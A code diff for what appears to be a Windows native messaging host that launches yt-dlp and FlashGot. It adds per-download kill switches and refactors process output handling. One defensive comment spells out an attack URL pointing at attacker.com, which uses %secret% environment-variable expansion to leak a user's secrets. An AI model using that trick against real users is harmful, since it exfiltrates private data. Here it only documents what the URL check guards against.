@@ -31,6 +31,8 @@ using namespace std;
 using namespace ggicci;
 using namespace base64;
 
+map<string, bool> ytdlKillSwitches;
+
 int wmain(int argc, WCHAR *argv[], WCHAR *envp[])
 {
 	//initializations
@@ -145,6 +147,10 @@ void processMessage(const Json &msg)
 		{
 			handle_ytdlget(msg);
 		}
+		else if(type == MSGTYP_YTDL_KILL)
+		{
+			handle_ytdlkill(msg);
+		}
 		else
 		{
 			messaging::sendMessage(MSGTYP_UNSUPP, "Unsupported message type");
@@ -167,19 +173,18 @@ void handle_getavail(const Json &msg)
 {
 	//TODO: output this directly from flashgot.exe
 	vector<string> args;
-	string fgOutput("");
-	DWORD exitCode = utils::launchExe("grabby_flashgot.exe", args, &fgOutput);
+	process_result res = utils::launchExe("grabby_flashgot.exe", args);
 
-	if( exitCode != 0 || fgOutput.length() == 0 )
+	if( res.exitCode != 0 || res.output.length() == 0 )
 	{
 		throw grb_exception("No output from grabby_flashgot.exe");
 	}
 
-	PLOG_INFO << "fg output be: " << fgOutput;
+	PLOG_INFO << "fg output be: " << res.output;
 
-	Json &dmsJSON = utils::parseJSON(fgOutput.c_str());
-	Json res = Json::Parse("{}");
-	res.AddProperty("type", Json("available_dms"));
+	Json &dmsJSON = utils::parseJSON(res.output.c_str());
+	Json avail = Json::Parse("{}");
+	avail.AddProperty("type", Json("available_dms"));
 	Json dms = Json::Parse("[]");
 	for(int i=0; i<dmsJSON.Size(); i++)
 	{
@@ -189,8 +194,8 @@ void handle_getavail(const Json &msg)
 			dms.Push(Json(name));
 		}
 	}
-	res.AddProperty("availableDMs", dms);
-	messaging::sendMessage(res);
+	avail.AddProperty("availableDMs", dms);
+	messaging::sendMessage(avail);
 }
 
 //handles "download" request
@@ -255,6 +260,12 @@ void handle_ytdlget(const Json &msg)
 	th1.detach();
 }
 
+void handle_ytdlkill(const Json &msg)
+{
+	string dlHash = msg["dlHash"].AsString();
+	ytdlKillSwitches[dlHash] = true;
+}
+
 //launches FlashGot to perform a download with a DM
 void flashgot_job(const string &jobJSON)
 {
@@ -262,11 +273,10 @@ void flashgot_job(const string &jobJSON)
 	{
 		vector<string> args;
 		args.push_back("download");
-		string output("");
-		DWORD exitCode = utils::launchExe("grabby_flashgot.exe", args, &output, jobJSON);
-		if(exitCode != 0)
+		process_result res = utils::launchExe("grabby_flashgot.exe", args, jobJSON);
+		if(res.exitCode != 0)
 		{
-			string msg = output + " - exit code: " + std::to_string(exitCode);
+			string msg = res.output + " - exit code: " + std::to_string(res.exitCode);
 			throw grb_exception(msg.c_str());
 		}
 	}
@@ -282,9 +292,9 @@ void ytdl_info_th(const string url, const string dlHash, ytdl_args *arger)
 {
 	try
 	{
-		string ytdlOutput = ytdl(url, arger->getArgs());
+		process_result res = ytdl(url, dlHash, arger->getArgs());
 
-		vector<string> lines = utils::strSplit(ytdlOutput, '\n');
+		vector<string> lines = utils::strSplit(res.output, '\n');
 
 		Json info;
 		string type = MSGTYP_YTDL_INFO;
@@ -325,7 +335,7 @@ void ytdl_info_th(const string url, const string dlHash, ytdl_args *arger)
 			//YTDL output not JSON
 			//Happens when YTDL outputs an error
 			info = Json("YouTubeDL returned an error. Consult the native app log for more info");
-			PLOG_ERROR << "YouTubeDL returned an error" << ytdlOutput;
+			PLOG_ERROR << "YouTubeDL returned an error" << res.output;
 		}
 
 		Json msg = Json::Parse("{}");
@@ -351,14 +361,14 @@ void ytdl_get_th(const string url, const string dlHash, ytdl_args *arger, const 
 			savePath = utils::fileSaveDialog(utils::sanitizeFilename(filename.c_str()));
 			savePath.append(".%(ext)s");
 		}
-		// if it's a plalist
+		// if it's a playlist
 		else
 		{
 			savePath = utils::folderOpenDialog();
 			savePath.append("%(title)s.%(ext)s");
 		}
 
-		//if it's canceled do nothing
+		// if user chose cancel in browse dialog do nothing
 		if(savePath.length() == 0)
 		{
 			delete arger;
@@ -369,9 +379,12 @@ void ytdl_get_th(const string url, const string dlHash, ytdl_args *arger, const 
 		arger->addArg(savePath);
 
 		output_callback callback(dlHash);
-		string output = ytdl(url, arger->getArgs(), &callback);
+		process_result res = ytdl(url, dlHash, arger->getArgs(), &callback);
 
-		string type = (output.length() > 0) ? MSGTYP_YTDL_COMP : MSGTYP_YTDL_FAIL;
+		string type;
+		if(res.exitCode == YTDL_CANCEL_CODE) type = MSGTYP_YTDL_KILL;
+		else if(res.exitCode == 0) type = MSGTYP_YTDL_COMP;
+		else type = MSGTYP_YTDL_FAIL;
 
 		Json msg = Json::Parse("{}");
 		msg.AddProperty("type", Json(type));
@@ -389,11 +402,11 @@ void ytdl_get_th(const string url, const string dlHash, ytdl_args *arger, const 
 	delete arger;
 }
 
-string ytdl(const string &url, vector<string> &args, output_callback *callback)
+process_result ytdl(const string &url, const string &dlHash, vector<string> &args, output_callback *callback)
 {
 	try
 	{
-		//ok so the issue is an attacker could make the user request a malicious URL and steal environment variables from them
+		//an attacker could make the user request a malicious URL and steal environment variables from them
 		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
 		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
 		//and send it to the attacker
@@ -407,16 +420,15 @@ string ytdl(const string &url, vector<string> &args, output_callback *callback)
 			throw grb_exception("This URL is not supported");
 		}
 
-		string output("");
-		DWORD exitCode = utils::launchExe("yt-dlp.exe", args, &output, "", callback);
+		//create a kill switch for this download and store it in the map
+		ytdlKillSwitches.insert(pair<string, bool>(dlHash, false));
+		bool &killSwitch = ytdlKillSwitches[dlHash];
 
-		//if our output is empty our callers know something went wrong
-		if(exitCode != 0)
-		{
-			output = "";
-		}
+		process_result res = utils::launchExe("yt-dlp.exe", args, "", killSwitch, callback);
 
-		return output;
+		ytdlKillSwitches.erase(dlHash);
+
+		return res;
 	}
 	catch(exception &e)
 	{
